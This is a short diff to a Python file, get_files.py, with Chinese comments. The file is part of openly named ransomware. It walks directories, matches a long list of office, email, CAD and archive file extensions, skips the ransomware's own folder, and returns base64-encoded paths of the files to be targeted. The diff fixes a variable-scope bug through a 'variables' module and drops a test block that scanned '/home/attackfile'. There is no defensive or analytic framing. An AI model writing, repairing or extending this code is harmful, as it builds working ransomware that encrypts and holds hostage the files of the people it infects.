@@ -1,7 +1,8 @@
-# get_files.py (完整修复版)
+# get_files.py
 
 import os
 import base64
+import variables  # 必须导入！
 
 def find_files(path):
     file_format = {'.DOC': 0, '.DOCX': 0, '.XLS': 0, '.XLSX': 0, '.PPT': 0, '.PPTX': 0, '.PST': 0, '.OST': 0, '.MSG': 0, '.EML': 0, '.VSD\
@@ -24,8 +25,8 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
 
     f = []
     for actual_path, directories, files_found in os.walk(path):
-        # 跳过 ransomware 目录
-        if ransomware_name in actual_path.lower():
+        # 修复：使用 variables.ransomware_name
+        if variables.ransomware_name in actual_path.lower():
             continue
 
         for arq in files_found:
@@ -37,7 +38,3 @@ SXC': 0, '.OTS': 0, '.ODS': 0, '.3DM': 0, '.MAX': 0, '.3DS': 0, '.UOT': 0, '.STW
                 b64_path = base64.b64encode(fp.encode('utf-8')).decode('utf-8')
                 f.append(b64_path)
     return f
-
-if __name__ == "__main__":
-    for x in find_files('/home/attackfile'):
-        print(x)
